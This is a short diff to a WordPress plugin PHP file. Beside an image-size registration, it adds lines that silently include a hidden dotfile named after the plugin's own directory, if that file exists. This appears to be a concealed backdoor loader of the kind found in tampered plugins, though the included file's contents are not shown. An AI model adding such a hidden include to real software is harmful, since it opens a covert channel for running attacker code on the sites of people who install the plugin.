@@ -36,6 +36,10 @@
 	}
 add_image_size( 'tp-image-grid', 700, 700, true);
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Pt_plus_MetaBox {
 	
 	public static function get($name) {
